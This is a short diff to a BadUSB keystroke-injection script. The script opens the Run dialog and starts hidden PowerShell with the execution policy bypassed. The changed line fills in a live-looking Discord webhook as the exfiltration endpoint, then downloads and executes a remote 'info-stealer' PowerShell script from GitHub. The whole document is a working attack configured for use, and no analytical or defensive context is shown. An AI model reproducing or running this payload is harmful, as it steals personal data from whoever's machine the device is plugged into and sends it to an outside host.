@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='';irm "LINK HERE" | iex
+STRING powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1162753443031687259/JnqnZD0hLEVE5GKyWZDR_G77ATlJanM96lFP2dS0En4WARNh-E9wV-LBjt7FXumW_xSs';irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/info-stealer/info-stealer.ps1 | iex
 ENTER
